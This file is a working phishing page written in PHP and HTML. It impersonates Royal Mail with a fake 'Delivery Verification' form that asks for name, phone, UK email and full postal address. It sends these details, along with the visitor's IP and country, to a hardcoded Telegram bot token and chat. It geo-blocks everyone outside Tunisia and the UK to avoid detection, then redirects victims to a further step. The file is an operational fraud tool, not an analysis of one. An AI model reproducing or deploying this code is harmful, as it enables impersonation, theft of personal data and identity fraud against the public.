<?php
// === ANTI-BOT PROTECTION ===
$bannedFile = __DIR__ . '/banned_ips.txt';

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
}
$ip = getUserIP();

// Get geo info
$details = @json_decode(file_get_contents("http://ip-api.com/json/$ip?fields=status,country"));
$country = ($details && $details->status === 'success') ? $details->country : 'Unknown';

// Check ban list
if (file_exists($bannedFile)) {
    $banned = file($bannedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($ip, $banned)) {
        header("HTTP/1.0 403 Forbidden");
        exit;
    }
}

// Allow only Tunisia and United Kingdom
$allowedCountries = ['Tunisia', 'United Kingdom'];
if (!in_array($country, $allowedCountries)) {
    header("HTTP/1.0 403 Forbidden");
    exit;
}

// === MAIN SCRIPT ===

define('TELEGRAM_BOT_TOKEN', '8134569625:AAG7bzuQM6wlzjzLfaFCVFPbuJ4qQQUTt6s');
define('TELEGRAM_CHAT_ID', '-4932499123');

$error = '';

function clean_input($data) {
    return htmlspecialchars(strip_tags(trim($data)));
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = clean_input($_POST['name'] ?? '');
    $phone = clean_input($_POST['phone'] ?? '');
    $email = clean_input($_POST['email'] ?? '');
    $country_input = clean_input($_POST['country'] ?? '');
    $address = clean_input($_POST['address'] ?? '');
    $city = clean_input($_POST['city'] ?? '');
    $state = clean_input($_POST['state'] ?? '');
    $zip = clean_input($_POST['zip'] ?? '');

    if (!$name || !$phone || !$email || !$country_input || !$address || !$city || !$state || !$zip) {
        $error = 'Please fill in all required fields.';
    } elseif (!preg_match('/^\+?[\d\s\-]{7,15}$/', $phone)) {
        $error = 'Please enter a valid phone number.';
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL) || !preg_match('/\.uk$/i', $email)) {
        $error = 'Please enter a valid UK email address ending with .uk';
    } else {
        $message = "📦 *New Delivery Verification* 📦\n";
        $message .= "──────────────────────────\n";
        $message .= "👤 *Name:* $name\n";
        $message .= "📞 *Phone:* $phone\n";
        $message .= "✉️ *Email:* $email\n";
        $message .= "🌍 *Country:* $country_input\n";
        $message .= "🏠 *Address:* $address\n";
        $message .= "🏙️ *City:* $city\n";
        $message .= "🗺️ *State:* $state\n";
        $message .= "📮 *ZIP Code:* $zip\n";
        $message .= "──────────────────────────\n";
        $message .= "⏰ *Timestamp:* " . date('Y-m-d H:i:s') . "\n";
        $message .= "🌐 *Visitor IP:* $ip\n";
        $message .= "🏳️ *Visitor Country:* $country\n";

        $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
        $post_fields = [
            'chat_id' => TELEGRAM_CHAT_ID,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);
        curl_close($ch);

        if ($result !== false) {
            header('Location: wait1.php');
            exit;
        } else {
            $error = 'Failed to send data. Please try again later.';
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Royal Mail Delivery Verification</title>
<link rel="icon" href="htdocs/img/favicon.jpg" />
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet" />
<style>
  :root {
    --rm-red: #cc0000;
    --rm-white: #fff;
    --rm-dark: #5c0000;
    --rm-grey-light: #f9f9f9;
    --rm-grey-dark: #333;
  }
  body {
    background-color: var(--rm-grey-light);
    font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    color: var(--rm-grey-dark);
  }
  nav.navbar {
    background-color: var(--rm-red);
  }
  nav.navbar .navbar-brand img {
    max-height: 50px;
  }
  .container {
    flex-grow: 1;
  }
  .form-card {
    background: var(--rm-white);
    max-width: 600px;
    margin: 3rem auto 4rem;
    padding: 2.5rem 3rem;
    border-radius: 12px;
    box-shadow: 0 8px 24px rgb(0 0 0 / 0.1);
    border-top: 5px solid var(--rm-red);
    transition: box-shadow 0.3s ease;
  }
  .form-card:hover {
    box-shadow: 0 12px 40px rgb(0 0 0 / 0.15);
  }
  h1, h4 {
    color: var(--rm-red);
    font-weight: 700;
  }
  label {
    font-weight: 600;
    color: var(--rm-grey-dark);
  }
  input.form-control {
    border-radius: 6px;
    border: 1.5px solid #ced4da;
    transition: border-color 0.3s ease;
  }
  input.form-control:focus {
    border-color: var(--rm-red);
    box-shadow: 0 0 8px var(--rm-red);
  }
  .btn-primary {
    background-color: var(--rm-red);
    border-color: var(--rm-red);
    font-weight: 700;
    border-radius: 8px;
    padding: 12px;
    font-size: 1.15rem;
    transition: background-color 0.3s ease;
  }
  .btn-primary:hover, .btn-primary:focus {
    background-color: var(--rm-dark);
    border-color: var(--rm-dark);
  }
  .alert {
    border-radius: 8px;
    font-weight: 600;
  }
  footer {
    background-color: var(--rm-red);
    color: var(--rm-white);
    text-align: center;
    padding: 1.25rem 0;
    font-size: 0.9rem;
  }
  footer img {
    max-height: 35px;
    margin-top: 8px;
  }
  @media (max-width: 575.98px) {
    .form-card {
      margin: 1.5rem 1rem 3rem;
      padding: 2rem 1.5rem;
    }
  }
</style>
</head>
<body>

<nav class="navbar navbar-expand-lg navbar-dark" role="banner">
  <div class="container">
    <a class="navbar-brand" href="#" aria-label="Royal Mail Home">
      <img src="https://images.seeklogo.com/logo-png/26/2/royal-mail-uk-logo-png_seeklogo-267922.png" alt="Royal Mail Logo" style="max-height:50px;" />
    </a>
  </div>
</nav>

<main class="container" role="main" aria-labelledby="pageTitle">
  <div class="form-card shadow-sm" aria-live="polite">
    <h1 id="pageTitle" class="mb-3"><i class="fas fa-box-open me-2"></i>Delivery Verification</h1>
    <h4 class="mb-4 text-secondary">Please confirm your delivery details below</h4>

    <?php if ($error): ?>
      <div class="alert alert-danger" role="alert"><?= htmlspecialchars($error) ?></div>
    <?php endif; ?>

    <form method="POST" novalidate>
      <div class="mb-3">
        <label for="name" class="form-label">Full Name <span class="text-danger">*</span></label>
        <input
          type="text"
          class="form-control"
          id="name"
          name="name"
          placeholder="John Smith"
          value="<?= htmlspecialchars($_POST['name'] ?? '') ?>"
          required
          autofocus
          autocomplete="name"
        />
      </div>

      <div class="mb-3">
        <label for="phone" class="form-label">Phone Number <span class="text-danger">*</span></label>
        <input
          type="tel"
          class="form-control"
          id="phone"
          name="phone"
          placeholder="+44 7123 456789"
          value="<?= htmlspecialchars($_POST['phone'] ?? '') ?>"
          required
          autocomplete="tel"
          pattern="^\+?[\d\s\-]{7,15}$"
          title="Enter a valid phone number"
        />
      </div>

      <div class="mb-3">
        <label for="email" class="form-label">Email (UK only) <span class="text-danger">*</span></label>
        <input
          type="email"
          class="form-control"
          id="email"
          name="email"
          placeholder="example@domain.uk"
          value="<?= htmlspecialchars($_POST['email'] ?? '') ?>"
          required
          autocomplete="email"
          pattern="^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.(uk|co\.uk|org\.uk|gov\.uk|ac\.uk)$"
          title="Please enter a valid UK email ending with .uk"
        />
      </div>

      <div class="mb-3">
        <label for="country" class="form-label">Country <span class="text-danger">*</span></label>
        <input
          type="text"
          class="form-control"
          id="country"
          name="country"
          placeholder="United Kingdom"
          value="<?= htmlspecialchars($_POST['country'] ?? '') ?>"
          required
          autocomplete="country"
        />
      </div>

      <div class="mb-3">
        <label for="address" class="form-label">Street Address <span class="text-danger">*</span></label>
        <input
          type="text"
          class="form-control"
          id="address"
          name="address"
          placeholder="123 Baker Street"
          value="<?= htmlspecialchars($_POST['address'] ?? '') ?>"
          required
          autocomplete="street-address"
        />
      </div>

      <div class="row">
        <div class="col-md-6 mb-3">
          <label for="city" class="form-label">City <span class="text-danger">*</span></label>
          <input
            type="text"
            class="form-control"
            id="city"
            name="city"
            placeholder="London"
            value="<?= htmlspecialchars($_POST['city'] ?? '') ?>"
            required
            autocomplete="address-level2"
          />
        </div>
        <div class="col-md-6 mb-3">
          <label for="state" class="form-label">County / State <span class="text-danger">*</span></label>
          <input
            type="text"
            class="form-control"
            id="state"
            name="state"
            placeholder="Greater London"
            value="<?= htmlspecialchars($_POST['state'] ?? '') ?>"
            required
            autocomplete="address-level1"
          />
        </div>
      </div>

      <div class="mb-4">
        <label for="zip" class="form-label">Postal Code <span class="text-danger">*</span></label>
        <input
          type="text"
          class="form-control"
          id="zip"
          name="zip"
          placeholder="SW1A 1AA"
          value="<?= htmlspecialchars($_POST['zip'] ?? '') ?>"
          required
          autocomplete="postal-code"
        />
      </div>

      <button type="submit" class="btn btn-primary w-100 shadow-sm" aria-label="Confirm Delivery Details">
        Confirm
      </button>
    </form>
  </div>
</main>

<footer role="contentinfo">
  <div>© 2025 Royal Mail Group Ltd</div>
  <img src="https://images.seeklogo.com/logo-png/26/2/royal-mail-uk-logo-png_seeklogo-267922.png" alt="Royal Mail Logo" style="max-height:35px; margin-top:8px;" />
</footer>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>